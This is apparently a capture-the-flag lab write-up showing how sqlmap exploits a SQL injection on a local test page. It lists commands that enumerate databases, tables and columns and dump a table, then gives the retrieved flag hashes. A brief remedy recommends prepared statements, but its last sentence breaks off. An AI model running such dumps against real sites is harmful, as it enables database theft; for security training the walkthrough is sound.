# SQL_Injection
Ahhhh the notorious SQL Injection again. blah blah blah we know the drill. However this time we will make use of a web scanning programme, that will not only find the web application's vulnerabilities but also also exploit them for us. It is called sqlmap.

## Example
For this part we will be making use of out terminal. We'll use the same url like the one we used in SQL_Injection. By using a series of commands we will not only be able to view the database but also save and make use of it's contents

## Commands
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a>
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --dbs
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --tables -D Member_images
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --columns -D Member_images -T list_mages
* sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --dump -D Member_images -T list_mages
> options [Y, Y, D, N]
## Retrieved Data
* flag md5 : 1928e8083cf461a51303633093573c46
* flag sh256: 5d5b09f6dcb2d53a5fffc60c4ac0d55fabdf556069d6631545f42aa6e3500f2e

## Remedy
* Similar to direct SQL_Injection this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input. sqlmap simply 

# Resources
* https://www.youtube.com/watch?v=ciNHn38EyRc